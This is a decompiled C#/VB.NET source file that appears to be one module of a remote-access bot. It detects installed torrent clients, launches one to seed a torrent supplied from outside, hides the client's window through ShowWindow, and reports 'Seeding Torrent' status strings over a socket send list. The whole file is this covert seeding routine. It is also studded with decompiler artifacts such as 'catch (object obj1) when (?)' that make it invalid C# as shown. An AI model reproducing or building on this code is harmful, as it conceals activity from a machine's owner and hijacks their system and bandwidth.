namespace Chat
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Threading;

    [StandardModule]
    internal sealed class Torrent
    {
        public static string BitLocalPath = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\BitTorrent\BitTorrent.exe");
        public static string BitTorrentPath = (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\BitTorrent\bittorrent.exe");
        public static string UTorrentLocalPath = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\uTorrent\uTorrent.exe");
        public static string UTorrentPath = (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\uTorrent\uTorrent.exe");
        public static string VuzeLocalPath = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Azureus\torrents\");
        public static string VuzePath = (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Vuze\Azureus.exe");

        public static string GetFileNameFromURL(string URL)
        {
            string str;
            try
            {
                str = URL.Substring(URL.LastIndexOf("/", StringComparison.Ordinal) + 1);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                str = URL;
                ProjectData.ClearProjectError();
                return str;
                ProjectData.ClearProjectError();
            }
            return str;
        }

        public static void HideIt(string TorrentClient)
        {
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                Thread.Sleep(0x3e8);
            Label_0017:
                num3 = 3;
                Process[] processesByName = Process.GetProcessesByName(TorrentClient);
            Label_0021:
                num3 = 4;
                ShowWindow(processesByName[0].MainWindowHandle.ToInt32(), 0);
                goto Label_00AA;
            Label_0040:;
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0017;

                    case 4:
                        goto Label_0021;

                    case 5:
                        goto Label_00AA;

                    default:
                        goto Label_009F;
                }
            Label_0064:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_009F;

                    case 1:
                        goto Label_0040;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0064;
            }
        Label_009F:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_00AA:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        public static bool IsBitTorrent()
        {
            bool flag;
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                if (!File.Exists(BitLocalPath))
                {
                    goto Label_0022;
                }
            Label_001B:
                num3 = 3;
                flag = true;
                goto Label_009A;
            Label_0022:
                num3 = 5;
                flag = false;
                goto Label_009A;
            Label_002D:;
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_001B;

                    case 4:
                    case 5:
                        goto Label_0022;

                    case 6:
                        goto Label_009A;

                    default:
                        goto Label_008F;
                }
            Label_0055:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_008F;

                    case 1:
                        goto Label_002D;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0055;
            }
        Label_008F:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_009A:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
            return flag;
        }

        public static bool IsUtorrent()
        {
            bool flag;
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                if (!File.Exists(UTorrentPath))
                {
                    goto Label_0022;
                }
            Label_001B:
                num3 = 3;
                flag = true;
                goto Label_009A;
            Label_0022:
                num3 = 5;
                flag = false;
                goto Label_009A;
            Label_002D:;
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_001B;

                    case 4:
                    case 5:
                        goto Label_0022;

                    case 6:
                        goto Label_009A;

                    default:
                        goto Label_008F;
                }
            Label_0055:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_008F;

                    case 1:
                        goto Label_002D;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0055;
            }
        Label_008F:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_009A:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
            return flag;
        }

        public static bool IsVuze()
        {
            bool flag;
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                if (!File.Exists(VuzePath))
                {
                    goto Label_0022;
                }
            Label_001B:
                num3 = 3;
                flag = true;
                goto Label_009A;
            Label_0022:
                num3 = 5;
                flag = false;
                goto Label_009A;
            Label_002D:;
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_001B;

                    case 4:
                    case 5:
                        goto Label_0022;

                    case 6:
                        goto Label_009A;

                    default:
                        goto Label_008F;
                }
            Label_0055:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_008F;

                    case 1:
                        goto Label_002D;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0055;
            }
        Label_008F:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_009A:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
            return flag;
        }

        public static void SeedIt(string ClientPath, string LocalPath, string TorrentPath)
        {
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                ProcessStartInfo startInfo = new ProcessStartInfo();
            Label_0012:
                num3 = 3;
                startInfo.FileName = ClientPath;
            Label_001D:
                num3 = 4;
                startInfo.Arguments = "/DIRECTORY " + LocalPath + " \"" + TorrentPath + "\"";
            Label_0059:
                num3 = 5;
                startInfo.CreateNoWindow = true;
            Label_0064:
                num3 = 6;
                Process process = Process.Start(startInfo);
            Label_006E:
                num3 = 7;
                if (!ClientPath.Contains("uTorrent"))
                {
                    goto Label_0092;
                }
            Label_0082:
                num3 = 8;
                HideIt("uTorrent");
                goto Label_0180;
            Label_0092:
                num3 = 10;
                if (!ClientPath.Contains("BitTorrent"))
                {
                    goto Label_00B8;
                }
            Label_00A7:
                num3 = 11;
                HideIt("BitTorrent");
                goto Label_0180;
            Label_00B8:
                num3 = 13;
                if (!ClientPath.Contains("Azureus"))
                {
                    goto Label_0180;
                }
            Label_00CD:
                num3 = 14;
                HideIt("Azureus");
                goto Label_0180;
            Label_00EA:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0012;

                    case 4:
                        goto Label_001D;

                    case 5:
                        goto Label_0059;

                    case 6:
                        goto Label_0064;

                    case 7:
                        goto Label_006E;

                    case 8:
                        goto Label_0082;

                    case 9:
                    case 12:
                    case 15:
                    case 0x10:
                        goto Label_0180;

                    case 10:
                        goto Label_0092;

                    case 11:
                        goto Label_00A7;

                    case 13:
                        goto Label_00B8;

                    case 14:
                        goto Label_00CD;

                    default:
                        goto Label_0175;
                }
            Label_0138:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_0175;

                    case 1:
                        goto Label_00EA;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0138;
            }
        Label_0175:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0180:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        public static void SeedItVuze(string ClientPath, string TorrentURL)
        {
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                ProcessStartInfo startInfo = new ProcessStartInfo();
            Label_0012:
                num3 = 3;
                startInfo.FileName = ClientPath;
            Label_001D:
                num3 = 4;
                startInfo.Arguments = TorrentURL;
            Label_0028:
                num3 = 5;
                startInfo.CreateNoWindow = true;
            Label_0033:
                num3 = 6;
                Process process = Process.Start(startInfo);
            Label_003D:
                num3 = 7;
                HideIt(Conversions.ToString((int) process.MainWindowHandle));
            Label_0056:
                num3 = 8;
                Thread.Sleep(0x3e8);
                goto Label_00E3;
            Label_006C:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0012;

                    case 4:
                        goto Label_001D;

                    case 5:
                        goto Label_0028;

                    case 6:
                        goto Label_0033;

                    case 7:
                        goto Label_003D;

                    case 8:
                        goto Label_0056;

                    case 9:
                        goto Label_00E3;

                    default:
                        goto Label_00D8;
                }
            Label_009D:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_00D8;

                    case 1:
                        goto Label_006C;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_009D;
            }
        Label_00D8:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_00E3:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        public static void SeedTorrent(string path)
        {
            int num2;
            try
            {
                int num3;
            Label_0001:
                ProjectData.ClearProjectError();
                int num = -2;
            Label_0009:
                num3 = 2;
                if (!IsVuze())
                {
                    goto Label_0040;
                }
            Label_0014:
                num3 = 3;
                SeedItVuze(VuzePath, path);
            Label_0022:
                num3 = 4;
                Socketss.ListDataSend.Add(new Data("SED|S|Seeding Torrent With Vuze", null, null));
                goto Label_0175;
            Label_0040:
                num3 = 6;
                if (!IsBitTorrent())
                {
                    goto Label_0079;
                }
            Label_004B:
                num3 = 7;
                SeedIt(BitLocalPath, BitLocalPath, path);
            Label_005E:
                num3 = 8;
                Socketss.ListDataSend.Add(new Data("SED|S|Seeding Torrent with BitTorrent", null, null));
                goto Label_0175;
            Label_0079:
                num3 = 10;
                if (!IsUtorrent())
                {
                    goto Label_00B5;
                }
            Label_0085:
                num3 = 11;
                SeedIt(UTorrentPath, UTorrentLocalPath, path);
            Label_0099:
                num3 = 12;
                Socketss.ListDataSend.Add(new Data("SED|S|Seeding Torrent with uTorrent", null, null));
                goto Label_0175;
            Label_00B5:
                num3 = 14;
            Label_00B9:
                num3 = 15;
                Socketss.ListDataSend.Add(new Data("SED|S|Unable to Seed: No Torrent Client Installed", null, null));
                goto Label_0175;
            Label_00DF:
                num2 = 0;
                switch ((num2 + 1))
                {
                    case 1:
                        goto Label_0001;

                    case 2:
                        goto Label_0009;

                    case 3:
                        goto Label_0014;

                    case 4:
                        goto Label_0022;

                    case 5:
                    case 9:
                    case 13:
                    case 0x10:
                    case 0x11:
                        goto Label_0175;

                    case 6:
                        goto Label_0040;

                    case 7:
                        goto Label_004B;

                    case 8:
                        goto Label_005E;

                    case 10:
                        goto Label_0079;

                    case 11:
                        goto Label_0085;

                    case 12:
                        goto Label_0099;

                    case 14:
                        goto Label_00B5;

                    case 15:
                        goto Label_00B9;

                    default:
                        goto Label_016A;
                }
            Label_0130:
                num2 = num3;
                switch (((num > -2) ? num : 1))
                {
                    case 0:
                        goto Label_016A;

                    case 1:
                        goto Label_00DF;
                }
            }
            catch (object obj1) when (?)
            {
                ProjectData.SetProjectError((Exception) obj1);
                goto Label_0130;
            }
        Label_016A:
            throw ProjectData.CreateProjectError(-2146828237);
        Label_0175:
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);
    }
}

